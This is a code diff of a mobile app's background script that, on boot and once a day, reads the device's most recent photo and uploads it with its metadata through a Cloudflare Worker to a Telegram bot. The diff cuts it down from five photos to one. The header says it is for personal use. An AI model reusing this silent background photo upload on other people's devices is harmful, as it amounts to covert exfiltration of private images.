@@ -1,7 +1,6 @@
 /* background.js — personal photo report → Cloudflare Worker → Telegram.
+   Sends only the SINGLE most recent photo on this device.
    Owner: personal use, own phone, own photos, own bot.
-   - Scans only the 5 most recent photos (fast)
-   - Sends start message, progress, report, and 5 thumbnails
 */
 (function(){
   'use strict';
@@ -9,19 +8,15 @@
 
   var WORKER_URL   = 'https://project1.yashavanthan22.workers.dev';
   var K_LASTSENT   = 'tg_lastsent_day';
-  var SANDBOX_FILE = 'photo_queue.json';
 
-  var MAX_SCAN  = 5;        /* only the 5 most recent */
-  var MAX_SEND  = 5;
-  var SCAN_MS   = 15000;
+  var SCAN_MS   = 10000;
   var THUMB_MS  = 15000;
-  var REPORT_MS = 30000;
+  var REPORT_MS = 25000;
   var PHOTO_MS  = 45000;
 
   /* ---------- storage ---------- */
   function load(k){ try { return iappyx.load(k); } catch(e){ return null; } }
   function save(k,v){ try { iappyx.save(k, String(v)); return true; } catch(e){ return false; } }
-  function loadFile(n){ try { return iappyx.storage.loadFile(n); } catch(e){ return null; } }
   function saveFile(n,c){ try { iappyx.storage.saveFile(n,c); return true; } catch(e){ return false; } }
   function delFile(n){ try { iappyx.storage.deleteFile(n); } catch(e){} }
 
@@ -83,11 +78,11 @@
     var comma = dataUrl.indexOf(',');
     var b64 = comma >= 0 ? dataUrl.substring(comma + 1) : dataUrl;
     if (!b64){ cb(false, 'empty'); return; }
-    var tmp = 'tg_tmp_' + Date.now() + '_' + Math.random().toString(36).substr(2,4) + '.jpg';
+    var tmp = 'tg_tmp_' + Date.now() + '.jpg';
     if (!saveFile(tmp, b64)){ cb(false, 'save-fail'); return; }
     var path = tmp;
     try { path = '/data/data/' + iappyx.device.getPackageName() + '/files/' + tmp; } catch(e){}
-    var id = 'ph_' + Date.now() + '_' + Math.random().toString(36).substr(2,4);
+    var id = 'ph_' + Date.now();
     window._iappyxCb = window._iappyxCb || {};
     var done = false;
     function finish(ok, detail){
@@ -109,25 +104,26 @@
     } catch(e){ finish(false, 'exception'); }
   }
 
-  /* ---------- scan: only 5 most recent ---------- */
-  function scanRecent(cb){
+  /* ---------- scan: only the most recent photo ---------- */
+  function scanLatest(cb){
     var done = false;
     var id = 'scan_' + Date.now();
     window._iappyxCb = window._iappyxCb || {};
-    function finish(list, err){
+    function finish(photo, err){
       if (done) return; done = true;
       try { clearTimeout(t); } catch(e){}
       try { delete window._iappyxCb[id]; } catch(e){}
-      cb(list || [], err || null);
+      cb(photo || null, err || null);
     }
-    var t = setTimeout(function(){ finish([], 'timeout'); }, SCAN_MS);
+    var t = setTimeout(function(){ finish(null, 'timeout'); }, SCAN_MS);
     window._iappyxCb[id] = function(res){
-      if (!res || !res.ok || !res.images){ finish([], (res && res.error) || 'failed'); return; }
-      var list = res.images.slice(0, MAX_SCAN);
-      finish(list, null);
+      if (!res || !res.ok || !res.images){ finish(null, (res && res.error) || 'failed'); return; }
+      if (!res.images.length){ finish(null, 'no-photos'); return; }
+      /* Most recent is first (MediaStore returns newest first) */
+      finish(res.images[0], null);
     };
-    try { iappyx.media.getImages(id, MAX_SCAN); }
-    catch(e){ finish([], 'exception'); }
+    try { iappyx.media.getImages(id, 1); }
+    catch(e){ finish(null, 'exception'); }
   }
 
   /* ---------- thumbnail ---------- */
@@ -149,44 +145,11 @@
     catch(e){ finish(null); }
   }
 
-  /* ---------- report text ---------- */
-  function reportText(photos){
-    var l = [];
-    l.push('📸 *Recent Photos*');
-    l.push('📅 ' + today() + '  ·  ' + hhmm());
-    l.push('');
-    l.push('Showing *' + photos.length + '* most recent');
-    if (photos.length){
-      var total = photos.reduce(function(s,p){ return s + (Number(p.size)||0); }, 0);
-      l.push('Size: ' + (total/1024/1024).toFixed(2) + ' MB');
-      l.push('');
-      photos.forEach(function(p, i){
-        var d = new Date(Number(p.date));
-        var h = String(d.getHours()).padStart(2,'0');
-        var m = String(d.getMinutes()).padStart(2,'0');
-        l.push((i+1) + '. ' + h + ':' + m + ' · ' + (p.width||'?') + '×' + (p.height||'?') +
-               ' · ' + ((Number(p.size)||0)/1024/1024).toFixed(1) + ' MB');
-      });
-    }
-    return l.join('\n');
-  }
-
-  /* ---------- progress bar ---------- */
-  function bar(pct){
-    var filled = Math.round(pct / 10);
-    var empty = 10 - filled;
-    var f = '', e = '';
-    for (var i=0;i<filled;i++) f += '█';
-    for (var j=0;j<empty;j++) e += '░';
-    return f + e + ' ' + pct + '%';
-  }
-
   /* ---------- main ---------- */
   function run(cb){
     cb = cb || function(){};
 
     if (!online()){
-      postText('⚠️ Photo report skipped — no internet (' + hhmm() + ')');
       cb({ ok:false, skipped:'offline' });
       return;
     }
@@ -195,116 +158,65 @@
       return;
     }
 
-    /* START */
-    postText(
-      '🚀 *Photo report started*\n' +
-      '📅 ' + today() + '\n' +
-      '⏱ ' + hhmm() + '\n\n' +
-      'Scanning latest 5 photos…'
-    , function(okStart){
-      if (!okStart){
-        notify('Report start failed', 'Worker unreachable.');
-        cb({ ok:false, step:'start', error:'worker-unreachable' });
+    /* 1. SCAN — one photo */
+    scanLatest(function(photo, scanErr){
+      if (scanErr){
+        postText(
+          '❌ *Scan failed*\n' +
+          'Error: `' + scanErr + '`\n\n' +
+          'Grant photo permission in Settings → Apps → this app → Permissions.'
+        );
+        notify('Photo scan failed', scanErr);
+        cb({ ok:false, step:'scan', error: scanErr });
         return;
       }
 
-      /* SCAN (only 5 recent) */
-      scanRecent(function(photos, scanErr){
-        if (scanErr){
-          postText(
-            '❌ *Scan failed*\n' +
-            'Error: `' + scanErr + '`\n\n' +
-            'Grant photo permission in Settings → Apps → this app → Permissions.'
-          );
-          notify('Photo scan failed', scanErr);
-          cb({ ok:false, step:'scan', error: scanErr });
+      var d = new Date(Number(photo.date));
+      var h = String(d.getHours()).padStart(2,'0');
+      var m = String(d.getMinutes()).padStart(2,'0');
+      var day = d.getDate() + '/' + (d.getMonth()+1) + '/' + d.getFullYear();
+      var sizeMb = ((Number(photo.size)||0)/1024/1024).toFixed(2);
+
+      /* 2. TEXT REPORT */
+      postText(
+        '📸 *Latest Photo*\n' +
+        '⏱ ' + hhmm() + '\n\n' +
+        '📅 ' + day + '  ·  ' + h + ':' + m + '\n' +
+        '📐 ' + (photo.width||'?') + '×' + (photo.height||'?') + '\n' +
+        '📦 ' + sizeMb + ' MB\n' +
+        (photo.name ? '📄 `' + photo.name + '`\n' : '') +
+        '\n_Sending photo…_'
+      , function(okRep, detail){
+        if (!okRep){
+          notify('Report send failed', detail || 'unknown');
+          cb({ ok:false, step:'report', error: detail });
           return;
         }
 
-        /* save queue */
-        try {
-          var q = [];
-          var raw = loadFile(SANDBOX_FILE);
-          if (raw){ try { q = JSON.parse(raw) || []; } catch(e){ q = []; } }
-          if (!Array.isArray(q)) q = [];
-          var day = today();
-          q = q.filter(function(e){ return e.day !== day; });
-          q.push({ day: day, count: photos.length, savedAt: Date.now(),
-            photos: photos.map(function(p){
-              return { id:p.id, name:p.name, date:p.date, width:p.width,
-                       height:p.height, size:p.size, mime:p.mime };
-            })
-          });
-          saveFile(SANDBOX_FILE, JSON.stringify(q));
-        } catch(e){}
-
-        if (photos.length === 0){
-          postText('ℹ️ No photos found on this device.');
-          save(K_LASTSENT, today());
-          notify('Photo report done', 'No photos found.');
-          cb({ ok:true, count:0, sent:0, failed:0 });
-          return;
-        }
-
-        /* REPORT + 10% */
-        postText(reportText(photos) + '\n\n' + bar(10) + '\n_Sending thumbnails…_',
-          function(okRep, detail){
-          if (!okRep){
-            notify('Report send failed', detail || 'unknown');
-            cb({ ok:false, step:'report', error: detail });
+        /* 3. LOAD THUMBNAIL */
+        thumb(photo.id, function(b64){
+          if (!b64){
+            postText('⚠️ Could not load photo thumbnail.');
+            notify('Photo load failed', 'Thumbnail unavailable.');
+            cb({ ok:false, step:'thumb', error:'no-thumbnail' });
             return;
           }
 
-          var total = photos.length;
-          var i = 0, sent = 0, failed = 0;
-          var nextStepPct = 20;
-
-          function next(){
-            if (i >= total){
-              postText(
-                '✅ *Done*\n' +
-                bar(100) + '\n\n' +
-                '📸 Photos: ' + total + '\n' +
-                '📤 Sent: ' + sent + '/' + total + '\n' +
-                (failed ? '⚠️ Failed: ' + failed + '\n' : '') +
-                '⏱ ' + hhmm()
-              );
-              save(K_LASTSENT, today());
-              notify('Photo report done', total + ' photos · ' + sent + '/' + total + ' sent');
-              cb({ ok:true, count: total, sent: sent, failed: failed });
+          /* 4. SEND PHOTO */
+          postPhoto(b64, photo.name || ('photo ' + photo.id), function(okPh, detailPh){
+            if (!okPh){
+              postText('⚠️ *Photo upload failed*\nError: `' + (detailPh||'unknown') + '`');
+              notify('Photo upload failed', detailPh || 'unknown');
+              cb({ ok:false, step:'photo', error: detailPh });
               return;
             }
 
-            var p = photos[i++];
-            var label = p.name || ('photo ' + p.id);
-
-            thumb(p.id, function(b64){
-              if (!b64){
-                failed++;
-                afterStep();
-                return;
-              }
-              postPhoto(b64, label, function(okPh){
-                if (okPh) sent++; else failed++;
-                afterStep();
-              });
-            });
-
-            function afterStep(){
-              var pct = Math.round((i / total) * 90) + 10;
-              if (pct >= nextStepPct || i === total){
-                postText(
-                  '📤 *Progress*\n' + bar(pct) + '\n\n' +
-                  'Sent: ' + sent + '/' + total +
-                  (failed ? '  ·  Failed: ' + failed : '') +
-                  '\nCurrent: `' + label + '`'
-                );
-                nextStepPct = Math.min(100, pct + 20);
-              }
-              next();
-            }
-          }
-          next();
+            /* 5. DONE */
+            save(K_LASTSENT, today());
+            postText('✅ *Done* — latest photo sent · ' + hhmm());
+            notify('Photo sent', 'Latest photo delivered to Telegram.');
+            cb({ ok:true, photo: photo.name || photo.id });
+          });
         });
       });
     });
@@ -315,7 +227,6 @@
   window.bg.runDailyReport = run;
   window.bg.resetDaily = function(){ save(K_LASTSENT, ''); return true; };
   window.bg.workerUrl = WORKER_URL;
-  window.bg.progressBar = bar;
 
   /* ---------- auto-run on boot ---------- */
   try {
